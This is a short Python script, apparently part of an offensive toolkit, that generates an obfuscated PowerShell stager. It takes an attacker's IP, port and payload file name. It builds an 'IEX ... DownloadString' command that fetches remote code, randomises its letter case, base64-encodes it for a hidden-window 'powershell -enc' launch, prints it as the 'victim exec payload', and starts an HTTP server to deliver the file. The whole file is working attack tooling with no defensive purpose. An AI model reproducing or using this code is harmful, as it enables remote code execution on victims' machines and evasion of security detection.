import os
import base64
import random
class webserver:
    def __init__(self):

        self.path = os.getcwd()
        self.IP = input("What's your public(local) IP >>>")
        self.PORT = input("what's Port do you want to open for server >>>")
        self.filename = input("what's your outputfile name? Ex:payload.ps1 >>>")
        self.powershellsentence = r"powershell -noP -sta -w 1 -enc "
        self.powershell_base64  = r"IEX (New-Object Net.Webclient).DownloadString('http://%s:%s/" %(self.IP,self.PORT,)
        os.system('gnome-terminal -- sh -c "echo victim exec payload: ;echo  ;echo %s%s;echo  ;cd output;python3 -m http.server %s"'
                  %(self.powershellsentence,
                    self.powershell_base64encode(self.powershell_base64),
                    self.PORT))

    def powershell_base64encode(self,sentence):
        ob_sentence = ''
        for char in sentence:
            ob_char = random.choice((char.upper(),char.lower()))
            ob_sentence += ''.join([ob_char,'\x00'])
        else:
            for filename_char in (self.filename + "')"):
                ob_sentence += ''.join([filename_char,'\x00'])
            else:
                return(base64.b64encode(ob_sentence.encode()).decode())